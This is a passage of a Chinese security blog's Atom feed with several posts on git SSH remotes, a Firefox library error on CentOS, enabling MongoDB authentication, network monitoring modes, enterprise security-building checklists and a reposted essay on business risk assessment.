    <content type="html"><![CDATA[<p>Github 设置使用了ssh key，每次提交代码还是需要输入用户名？？？</p><a id="more"></a><p>检查发现，在设置远程url的时候使用了https</p><p><a href="https://github.com/Pa55w0rd/pa55w0rd.github.io.git" target="_blank" rel="noopener">https://github.com/Pa55w0rd/pa55w0rd.github.io.git</a></p><p>使用git remote set-url命令从https切换到ssh<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># git remote <span class="keyword">set</span>-url <span class="comment">origin git+ssh:</span>//<span class="comment">git@github.com</span>/Pa55w0rd/<span class="comment">pa55w0rd.github.io.git</span></span><br></pre></td></tr></table></figure></p><p>通过git remote -v命令验证是否成功<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git remote -v</span></span><br><span class="line"><span class="attribute">origin</span>  git+ssh://git<span class="variable">@github</span>.com/Pa55w0rd/pa55w0rd.github.io.git (fetch)</span><br><span class="line">origin  git+ssh://git<span class="variable">@github</span>.com/Pa55w0rd/pa55w0rd.github.io.git (push)</span><br></pre></td></tr></table></figure></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="建立远程仓库"><a href="#建立远程仓库" class="headerlink" title="建立远程仓库"></a>建立远程仓库</h3><p>进入GitHub，点击右上角 + 号，选择New repository</p><p>输入仓库名称，点击 Create repository</p><h3 id="建立本地仓库"><a href="#建立本地仓库" class="headerlink" title="建立本地仓库"></a>建立本地仓库</h3><p>建立目录，将文件夹初始化为git可以管理的仓库</p><p>git init</p><h3 id="与远程仓库关联"><a href="#与远程仓库关联" class="headerlink" title="与远程仓库关联"></a>与远程仓库关联</h3><p>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:Pa55w0rd/pa55w0rd.github.io.git</p><h3 id="添加到暂存区"><a href="#添加到暂存区" class="headerlink" title="添加到暂存区"></a>添加到暂存区</h3><p>git add .   </p><blockquote><p>注意最后边的 .</p></blockquote><h3 id="提交暂存区到仓库区"><a href="#提交暂存区到仓库区" class="headerlink" title="提交暂存区到仓库区"></a>提交暂存区到仓库区</h3><p>git commit -m “init”</p><h3 id="上传本地仓库到远程仓库"><a href="#上传本地仓库到远程仓库" class="headerlink" title="上传本地仓库到远程仓库"></a>上传本地仓库到远程仓库</h3><p>git push origin master</p><h3 id="显示变更的文件"><a href="#显示变更的文件" class="headerlink" title="显示变更的文件"></a>显示变更的文件</h3><p>git status</p><h3 id="克隆远程仓库到本地"><a href="#克隆远程仓库到本地" class="headerlink" title="克隆远程仓库到本地"></a>克隆远程仓库到本地</h3><p>git clone <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:Pa55w0rd/pa55w0rd.github.io.git</p><h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><p>参考 <a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">阮一峰_ 常用Git命令清单</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Github 设置使用了ssh key，每次提交代码还是需要输入用户名？？？&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="解决方法" scheme="http://www.pa55w0rd.club/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Centos 7 运行firefox出错</title>
    <link href="http://www.pa55w0rd.club/linux_firefox_error/"/>
    <id>http://www.pa55w0rd.club/linux_firefox_error/</id>
    <published>2018-11-06T09:03:11.000Z</published>
    <updated>2018-11-21T11:29:18.378Z</updated>
    
    <content type="html"><![CDATA[<p>Centos 7 在firefox官网下载了最新的安装包，运行后提示</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># firefox</span><br><span class="line">XPCOMGlueLoad <span class="keyword">error</span> <span class="keyword">for</span> <span class="keyword">file</span> /root/fuzzingbox/firefox/libmozgtk.<span class="keyword">so</span>:</span><br><span class="line">libgtk-3.<span class="keyword">so</span>.0: cannot <span class="keyword">open</span> shared object <span class="keyword">file</span>: <span class="keyword">No</span> such <span class="keyword">file</span> or directory</span><br><span class="line">Couldn't load XPCOM.</span><br></pre></td></tr></table></figure><a id="more"></a><p>提示缺少libgtk-3.so库<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> gtk3</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Centos 7 在firefox官网下载了最新的安装包，运行后提示&lt;/p&gt;
&lt;figure class=&quot;highlight stata&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# firefox&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XPCOMGlueLoad &lt;span class=&quot;keyword&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;file&lt;/span&gt; /root/fuzzingbox/firefox/libmozgtk.&lt;span class=&quot;keyword&quot;&gt;so&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libgtk-3.&lt;span class=&quot;keyword&quot;&gt;so&lt;/span&gt;.0: cannot &lt;span class=&quot;keyword&quot;&gt;open&lt;/span&gt; shared object &lt;span class=&quot;keyword&quot;&gt;file&lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;No&lt;/span&gt; such &lt;span class=&quot;keyword&quot;&gt;file&lt;/span&gt; or directory&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Couldn&#39;t load XPCOM.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="解决方法" scheme="http://www.pa55w0rd.club/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>mongodb开启认证</title>
    <link href="http://www.pa55w0rd.club/mongodb_auth/"/>
    <id>http://www.pa55w0rd.club/mongodb_auth/</id>
    <published>2018-11-01T05:35:11.000Z</published>
    <updated>2018-11-23T07:55:59.876Z</updated>
    
    <content type="html"><![CDATA[<p>修改配置文件，开启认证</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># vi /etc/mongod.conf</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">    security:</span></span><br><span class="line"><span class="symbol">    authorization:</span>enablesd</span><br></pre></td></tr></table></figure><a id="more"></a><p>创建密码</p><ul><li><strong>db.createUser({ user: “w11scan”, pwd: “w11scan”, roles: [{ role: “dbOwner”, db: “w11scan_config” }] })</strong>  <br>mongo创建db密码</li><li><strong>db.auth(“useradmin”, “adminpassword”)</strong> <br>验证，1表示成功<br>mongodb中的用户是基于身份role的<ul><li>管理员账户的 role是 userAdminAnyDatabase，‘userAdmin’代表用户管理身份，’AnyDatabase’ 代表可以管理任何数据库。</li><li>dbOwner 代表数据库所有者角色，拥有最高该数据库最高权限。比如新建索引等</li><li>readWrite 该用户用于该数据的读写，只拥有读写权限。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;修改配置文件，开启认证&lt;/p&gt;
&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# vi /etc/mongod.conf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;    security:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;    authorization:&lt;/span&gt;enablesd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="mongodb" scheme="http://www.pa55w0rd.club/tags/mongodb/"/>
    
      <category term="数据库" scheme="http://www.pa55w0rd.club/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>旁路监控</title>
    <link href="http://www.pa55w0rd.club/%E6%97%81%E8%B7%AF%E7%9B%91%E6%8E%A7/"/>
    <id>http://www.pa55w0rd.club/旁路监控/</id>
    <published>2018-11-01T05:33:11.000Z</published>
    <updated>2018-11-23T07:59:19.163Z</updated>
    
    <content type="html"><![CDATA[<p>常见的网络监控模式可以分为两种：一种是旁路监控模式，另一种是串联监控模式。</p><p>“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。</p><p>而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。</p><a id="more"></a><p>旁路模式的优缺点</p><p><strong>优点：</strong></p><ul><li><p>旁路监控模式部署起来比较灵活方便，只需要在交换机上面配置镜像端口即可。不会影响现有的网络结构。而串联模式一般要作为网关、网桥或者代理服务器，所以需要对现有网络结构进行变动。</p></li><li><p>旁路模式分析的是镜像端口拷贝过来的数据，对原始传递的数据包不会造成延时，不会对网速造成任何影响。而串联模式是串联在网络中的，那么所有的数据必须先经过监控系统，通过监控系统的分析检查之后，才能够发送到各个客户端，所以会对网速有一定的延时。</p></li><li><p>旁路监控设备一旦故障或者停止运行，不会影响现有网络。而串联监控设备如果出现故障，如无硬件bypass功能，会导致网络中断。</p></li></ul><p><strong>缺点：</strong></p><ul><li><p>需要交换机或者路由支持“端口镜像”功能才可以实现监控。</p></li><li><p>旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，一般还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在该问题。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常见的网络监控模式可以分为两种：一种是旁路监控模式，另一种是串联监控模式。&lt;/p&gt;
&lt;p&gt;“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。&lt;/p&gt;
&lt;p&gt;而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="基础知识" scheme="http://www.pa55w0rd.club/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>基线加固文档</title>
    <link href="http://www.pa55w0rd.club/%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/"/>
    <id>http://www.pa55w0rd.club/基线加固/</id>
    <published>2018-11-01T05:32:11.000Z</published>
    <updated>2018-11-23T07:59:01.778Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/re4lity/Benchmarks" target="_blank" rel="noopener">https://github.com/re4lity/Benchmarks</a></p><p><a href="https://learn.cisecurity.org/benchmarks" target="_blank" rel="noopener">https://learn.cisecurity.org/benchmarks</a></p><p><a href="https://nvd.nist.gov/ncp/repository" target="_blank" rel="noopener">https://nvd.nist.gov/ncp/repository</a></p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/re4lity/Benchmarks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/re4lity/Benchmarks&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://learn.cisecurity.org/benchmarks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://learn.cisecurity.org/benchmarks&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/ncp/repository&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://nvd.nist.gov/ncp/repository&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="基线加固" scheme="http://www.pa55w0rd.club/tags/%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>甲方安全建设步骤 By pirogue</title>
    <link href="http://www.pa55w0rd.club/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%AD%A5%E9%AA%A4/"/>
    <id>http://www.pa55w0rd.club/甲方安全建设步骤/</id>
    <published>2018-10-31T09:17:35.000Z</published>
    <updated>2018-11-21T08:50:13.296Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>资产梳理</p><ul><li>IP列表、业务分组(负责人、联系方向)、业务属性</li><li>业务端口</li><li>业务应用架构、技术堆栈</li></ul></li><li><p>边界安全，防火墙策略控制（需要梳理业务端口）</p></li></ol><a id="more"></a><pre><code>- 如果是硬件，使用防火墙统一控制- 如果是操作系统，Iptalbes＋IPSEC- 及时监控业务端口的变化（外部nmap扫描搜集结果比对，或者编写脚步放到运维平台收集系统监听端口和防火墙策略)- 跳板机安全控制</code></pre><ol start="3"><li><p>账户安全管理</p><ul><li>弱密码</li><li>root、sudoer权限</li><li>账户、授权、访问、审计等等</li></ul></li><li><p>服务器安全</p><ul><li>安全基线检测</li><li>操作审计</li><li>异常登录审计(日志收集分析)</li><li>漏洞清点/扫描，补丁修复测试和推进</li></ul></li><li><p>WEB安全</p><ul><li>应用渗透测试</li><li>接口安全(加密、通信)</li><li>webshell实时监测</li><li>Nginx日志分析/Nginx流量旁路分析</li></ul></li><li><p>业务风控安全</p><ul><li>用户安全机制（密码、验证码、登录）</li><li>交易安全</li></ul></li><li><p>安全培训</p><ul><li>安全意识培训</li><li>运维安全培训</li><li>WEB安全开发</li></ul></li><li><p>安全规范和流程</p><ul><li>人员入职账户开通</li><li>人员离职账户注销</li><li>服务器上下架安全管理</li><li>安全应急响应机制</li></ul></li><li><p>内网安全</p><ul><li>内网服务器安全</li><li>账户统一验证和管理机制(域ldap协议统一验证OA、RTX、邮件、内网业务系统)</li><li>弱口令监测(NTLM/LM)</li><li>账户异常登录</li><li>网络隔离（物理／虚拟化）</li><li>网络准入</li><li>PC安全（病毒统一管理、通知处理）</li></ul></li></ol><p><strong>一张图看透办公网安全 -Eleven</strong></p><p><img src="\assets\img\办公网安全.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;资产梳理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IP列表、业务分组(负责人、联系方向)、业务属性&lt;/li&gt;
&lt;li&gt;业务端口&lt;/li&gt;
&lt;li&gt;业务应用架构、技术堆栈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;边界安全，防火墙策略控制（需要梳理业务端口）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="内网安全" scheme="http://www.pa55w0rd.club/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>企业安全建设中评估业务潜在风险的思路（转发）</title>
    <link href="http://www.pa55w0rd.club/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD%E8%AF%84%E4%BC%B0%E4%B8%9A%E5%8A%A1%E6%BD%9C%E5%9C%A8%E9%A3%8E%E9%99%A9%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
    <id>http://www.pa55w0rd.club/企业安全建设中评估业务潜在风险的思路/</id>
    <published>2018-10-31T09:16:35.000Z</published>
    <updated>2018-11-21T08:49:45.373Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>From : <a href="https://xz.aliyun.com/t/1529/" target="_blank" rel="noopener">elknot@360corpsec</a></p></blockquote><h2 id="0x00-写在前面："><a href="#0x00-写在前面：" class="headerlink" title="0x00 写在前面："></a>0x00 写在前面：</h2><p>昨天和某巨佬私下交流的时候，巨佬遇到了一个问题，甲方有一个比较难搞的需求：让这位巨佬给他提供一个安全攻击态势的模型。当时这个需求听完之后我觉得有点难办。但是后来想了一下也不是没有可能去做，由于以下的说法仅作为一些思路，落地性还有待考察，所以大家针对落地问题先不要去喷了。</p><h2 id="0x01-所谓安全攻击态势是什么"><a href="#0x01-所谓安全攻击态势是什么" class="headerlink" title="0x01 所谓安全攻击态势是什么"></a>0x01 所谓安全攻击态势是什么</h2><a id="more"></a><p>跟巨佬的进一步聊天中，我大概明白了甲方的意思：对下属子公司进行考核。其实巨佬自己也知道这个模型偏向于管理而非技术，只是需要技术数据的支撑。那么实际上其实根据我个人的理解就是：客户需要把业务系统所面临的潜在风险罗列出来，并且考核安全部门对于这些潜在风险的解决成果。</p><p>那么我们的思路就逐渐清晰了，我们需要了解的也就是业务系统会面临那些潜在的风险和安全部门应对这些风险的技战术手段。</p><h2 id="0x02-业务系统潜在风险"><a href="#0x02-业务系统潜在风险" class="headerlink" title="0x02 业务系统潜在风险"></a>0x02 业务系统潜在风险</h2><p>但从业务系统的潜在风险来判断的话，很多人第一反应就是日志，换句话说，很多领导要是问安全部门的同事我们系统的潜在风险是什么，经验不足的安全管理人员可能会马上从SIEM中抽取相关的安全日志（如果连SIEM都没有的话，那就是只能亲自动手去所有的安全设备的日志中逐条检索，所以针对大型的系统而言，规模越大SIEM的需求也就越高），然后按照攻击事件的数量排序，最后给出来一个所谓的“业务安全潜在风险分析报告”。但是各位仔细想一下就会发现这份报告实际上是有问题的，首先领导要的是“业务系统潜在风险”，而非是“已经发生的安全事件的统计”，换句话说安全部门提供的报告是领导期望的。那么如何评定业务系统的潜在风险呢？</p><p><strong>（1）业务系统活跃指数</strong></p><p>首先，针对一个系统而言，业务系统的活跃指数也就是能够被人访问到的几率是一个指标，如果这个业务系统被网络隔离了，也就只有内部的人可以访问的到，那么攻击面就大大减小了。那么如何判断这个系统的活跃指数呢。个人认为PV、UV、搜索引擎排名和Alexa指数这四个数据可以一定程度上来描述业务系统的活跃指数，PV、UV越大、搜索引擎排名越高、Alexa指数越高则说明了该系统被互联网用户访问到的可能性就越大，意味着被攻击的概率也就越高。</p><p><img src="\assets\img\xss\1.jpg" alt=""></p><p>上面这张图表示的就是Alexa的指数，指数越高也就是用户访问越频繁。当然这个只是其中的一方面，越活跃不一定代表受攻击的可能越大。</p><p><strong>（2）业务安全风险评定</strong></p><p>活跃指数只能判断出该业务系统被访问的次数，但是这仅仅是外因。被攻击的可能起决定因素的不是外因而是内因。所谓的内因也就是业务系统资深的原因，比如说用了不安全的框架、中间件存在已知漏洞、管理平台弱口令等等，然而这些问题其实解决起来不是特别的容易，一方面原因是业务系统稳定之后不太可能进行大范围的重构，二是因为开发部门对于安全方面可能不是特别懂，甚至有些大哥直接把测试环境部署到外网上去。</p><p>其实这些问题如果企业按部就班的走SDL的话，问题应该不大，因为SDL对于系统的安全开发存在一步威胁建模，就比如下面这张图：</p><p><img src="\assets\img\威胁类别与应对策略.png" alt=""></p><p> STRIDE威胁建模其实是一个很好的评估手段，但是很不幸，很多业务并不会去遵守这一套，这里安全部门就要多跑腿了，要定期对业务系统进行主动的渗透测试和安全监测，保证业务系统不存在可以被恶意利用的漏洞，</p><p> <strong>（3）历史攻击攻击行为比对</strong></p><p>这一部分其实就是从SIEM中抽取对应业务系统的安全日志，然后将其统计分类最后按照影响范围统计出来攻击的行为，但是这么做的话还远远不够，因为攻击日志里面有些是成功的有些是失败的，有些是人产生的有些是机器产生的。判断历史攻击行为的时候应当注意以下几点：</p><ol><li>确保SIEM中日志的有效性和准确性</li><li>统计攻击事件中成功次数与总次数所占的比例</li><li>列出所有攻击行为有特点的IP进行简单溯源</li><li>对攻击成功的IP进行重点监测并进行针对性溯源</li><li>回顾以往众测或者企业SRC收上来的漏洞利用报告</li></ol><p>这样的话你将会得到：</p><ul><li>一份带有详细数据的事件统计报告</li><li>一份发起攻击行为IP的列表</li><li>一份成功发起攻击行为IP的列表</li><li>N份漏洞利用及分析报告</li></ul><p>统计完成之后接下来就可以进行下一环节。</p><p><strong>（4）IP溯源及引入情报体系</strong></p><p>上面我们得到了一些攻击IP的数据，有些是成功的有些是失败的，这时候我们可以利用外部的威胁情报数据对这些IP进行浅层次或者深层次的溯源，浅层次的溯源主要是针对发起攻击但是失败的，需要收集的信息包括：IP的信誉度、地理位置、绑定的域名、域名注册时间、接入类型、被恶意标记的内容。</p><p>这些信息可以帮助我们去判断这些IP是不是肉鸡还是真实的攻击者，举个例子，假设一个IP的是一个荷兰OVH的主机，对我们输出的日志大多数都为扫描、注入类型的攻击，我们只接通过网络策略把这个IP拉黑了就可以了，因为他不是一个真是的攻击者而是一台肉鸡。相反的，如果一个IP攻击的行为包括社工、撞库、恶意漏洞利用、shell管理，并且接入方式是家庭宽带动态IP，那么这个IP我们就应该重点关注，甚至对其进行更深层次的溯源分析。</p><p>所谓深层次溯源分析，针对的主要是一些攻击行为有特点且明显不是自动化行为的攻击，比如上面那个例子。深层的溯源不是要把这个人的户口本全查一遍，然后家里几亩地，地里几头牛这些全都搞出来。之前我在ISC2017的大数据威胁分析论坛上面分享过我个人的观点——真的没必要大费周章把攻击的人直接抓出来，劳民伤财又费力不讨好，甚至没准还会触犯法律。我们需要明白的是攻击者瞄准的目标、攻击的套路和攻击者到底是出于什么样的目的攻击就足够了。</p><p>针对高级的溯源，我们需要采集的数据是：</p><ul><li>攻击者使用的基础设施</li><li>攻击者的意图</li><li>攻击者的成功率</li><li>攻击者的Kill-Chain模型</li><li>攻击者瞄准的行业和系统</li></ul><p>那么实际上高级溯源的结果我们也是有所区分的，比如说某些攻击者满天撒网导出扫描，抓到一个搞一个，这种的攻击者其实是没有价值的，通过网络策略直接ban了就完了。但是如果瞄准特定行业，攻击手段比较黑科技，而且Kill-Chain完整，攻击能力稳准狠，对待这种攻击者我们就应该去重点观察一下了，比如说把他的所有流量通过流量牵引到蜜罐里，观察他的操作。</p><p>其实说到这里，我们研究了所有的攻击者，可以把攻击我们的人都是什么来路摸清楚了。</p><p><strong>（5）SOC团队素质</strong></p><p>敌人分析完了，我们自己人也得分析分析，分析自己人最好的方法其实就是三个场景：重保、演习和众测。</p><p>出去前一个是有个别地方有需求，其他的两个都是可以找第三方团队去做的，主要目的是为了测试SOC针对外部威胁如何快速准确定位然后消灭威胁。</p><p>根据PDR模型来判断，如果响应时间Rt和检测时间Dt事件越短，同时防御时间Pt可以做到足够的长。攻击者得手的可能性越低。</p><h2 id="0x03-写报告"><a href="#0x03-写报告" class="headerlink" title="0x03 写报告"></a>0x03 写报告</h2><p>笔者个人认为态势感知不是跟x管家、x卫士那种随便打个分数就完了，态势感知的目的是为了给客户提供潜在的攻击行为和应对的策略，应该是完整的建议。态势感知如果要是打分的话这个产品一定是假的，大家不要相信。</p><p>如果输出报告的话，报告中应包含</p><ul><li>内因分析：威胁建模、安全手段评估、SOC素质、渗透测试和众测等</li><li>外因分析：业务系统活跃度、对外ACL、外部情报数据和对攻击者的认知。</li></ul><p>具体怎么写，相信愿意看这篇文章的人应该都比我懂。</p><p><strong>p.s.</strong> 文章仅代表个人观点，不代表其它的观点。</p><p><strong>Q：</strong>评价业务安全风险的时候，是不是也应该包括业务所处基础环境的安全风险（物理、所处网络环境、操作系统及一些框架之类的）？</p><p><strong>A：</strong>首先，您说的这些东西都是包含在内的，这一部分都已经集成到SDL和威胁建模环节，具体的一个业务上线流程请看</p><p><img src="\assets\img\xss\3.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;From : &lt;a href=&quot;https://xz.aliyun.com/t/1529/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;elknot@360corpsec&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-写在前面：&quot;&gt;&lt;a href=&quot;#0x00-写在前面：&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面：&quot;&gt;&lt;/a&gt;0x00 写在前面：&lt;/h2&gt;&lt;p&gt;昨天和某巨佬私下交流的时候，巨佬遇到了一个问题，甲方有一个比较难搞的需求：让这位巨佬给他提供一个安全攻击态势的模型。当时这个需求听完之后我觉得有点难办。但是后来想了一下也不是没有可能去做，由于以下的说法仅作为一些思路，落地性还有待考察，所以大家针对落地问题先不要去喷了。&lt;/p&gt;
&lt;h2 id=&quot;0x01-所谓安全攻击态势是什么&quot;&gt;&lt;a href=&quot;#0x01-所谓安全攻击态势是什么&quot; class=&quot;headerlink&quot; title=&quot;0x01 所谓安全攻击态势是什么&quot;&gt;&lt;/a&gt;0x01 所谓安全攻击态势是什么&lt;/h2&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="安全评估" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"/>
    
      <category term="业务安全" scheme="http://www.pa55w0rd.club/tags/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
